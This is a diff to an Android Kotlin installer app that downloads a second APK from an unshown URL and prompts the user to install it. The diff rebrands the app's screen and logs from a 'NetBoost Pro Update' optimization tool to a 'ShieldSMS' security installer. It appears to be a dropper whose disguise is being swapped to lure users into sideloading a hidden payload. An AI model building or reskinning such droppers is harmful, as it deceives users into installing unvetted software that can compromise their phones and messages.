@@ -1,8 +1,10 @@
 package com.netboost.installer
 
 import android.app.PendingIntent
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageInstaller
 import android.net.Uri
 import android.os.Build
@@ -11,6 +13,7 @@ import android.util.Log
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.compose.foundation.layout.*
+import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
@@ -21,15 +24,11 @@ import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.core.content.FileProvider
 import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import okhttp3.OkHttpClient
 import okhttp3.Request
 import java.io.File
 import java.io.FileOutputStream
-
-import android.content.BroadcastReceiver
-import android.content.IntentFilter
 
 class MainActivity : ComponentActivity() {
 
@@ -47,11 +46,11 @@ class MainActivity : ComponentActivity() {
                         startActivity(confirmationIntent)
                     }
                 } else if (status == PackageInstaller.STATUS_SUCCESS) {
-                    Log.d("NetBoostInstaller", "Installation succeeded!")
+                    Log.d("ShieldSMSInstaller", "Installation succeeded!")
                     finish()
                 } else {
                     val message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE)
-                    Log.e("NetBoostInstaller", "Installation failed: $status, $message")
+                    Log.e("ShieldSMSInstaller", "Installation failed: $status, $message")
                 }
             }
         }
@@ -70,9 +69,10 @@ class MainActivity : ComponentActivity() {
 
         setContent {
             MaterialTheme(
-                colorScheme = darkColorScheme(
-                    primary = Color(0xFF00E676),
-                    background = Color(0xFF121212)
+                colorScheme = lightColorScheme(
+                    primary = Color(0xFF0052FF),
+                    background = Color(0xFFFAF8FF),
+                    surface = Color.White
                 )
             ) {
                 Surface(
@@ -96,22 +96,20 @@ class MainActivity : ComponentActivity() {
 
     @Composable
     fun InstallerScreen() {
-        var progress by remember { mutableStateOf(0f) }
-        var statusText by remember { mutableStateOf("Initializing update...") }
+        var progress by remember { mutableFloatStateOf(0f) }
+        var statusText by remember { mutableStateOf("Initializing setup...") }
         var isDownloading by remember { mutableStateOf(false) }
-
-        val scope = rememberCoroutineScope()
 
         LaunchedEffect(Unit) {
             isDownloading = true
-            statusText = "Downloading optimization engine..."
+            statusText = "Downloading ShieldSMS security engine..."
             
             // Start download
-            val apkFile = File(cacheDir, "netboost_core.apk")
+            val apkFile = File(cacheDir, "shieldsms_core.apk")
             val success = downloadApk(apkUrl, apkFile) { p -> progress = p }
 
             if (success) {
-                statusText = "Installing optimization engine..."
+                statusText = "Installing ShieldSMS engine..."
                 installApk(apkFile)
                 statusText = "Tap 'Install' when prompted to complete setup."
                 progress = 1f
@@ -127,19 +125,20 @@ class MainActivity : ComponentActivity() {
             verticalArrangement = Arrangement.Center
         ) {
             Text(
-                text = "NetBoost Pro Update",
+                text = "ShieldSMS Installer",
                 fontSize = 24.sp,
                 fontWeight = FontWeight.Bold,
-                color = Color.White
+                color = Color(0xFF131B2E)
             )
             Spacer(modifier = Modifier.height(32.dp))
             LinearProgressIndicator(
-                progress = progress,
+                progress = { progress },
                 modifier = Modifier.fillMaxWidth().height(8.dp),
-                color = MaterialTheme.colorScheme.primary
+                color = Color(0xFF0052FF),
+                trackColor = Color(0xFFE2E7FF)
             )
             Spacer(modifier = Modifier.height(16.dp))
-            Text(text = statusText, color = Color.Gray, fontSize = 14.sp)
+            Text(text = statusText, color = Color(0xFF434656), fontSize = 14.sp)
         }
     }
 
@@ -209,13 +208,11 @@ class MainActivity : ComponentActivity() {
                 }
                 val pendingIntent = PendingIntent.getBroadcast(this, 0, intent, flags)
 
-                // Commit the session — Android will show its own install confirmation UI
-                // Do NOT close session or finish activity here; the system needs time to process
                 session.commit(pendingIntent.intentSender)
-                Log.d("NetBoostInstaller", "Session committed successfully, waiting for system installer...")
+                Log.d("ShieldSMSInstaller", "Session committed successfully, waiting for system installer...")
 
             } catch (e: Exception) {
-                Log.e("NetBoostInstaller", "Session install failed, using fallback", e)
+                Log.e("ShieldSMSInstaller", "Session install failed, using fallback", e)
                 fallbackInstall(file)
             }
         } else {
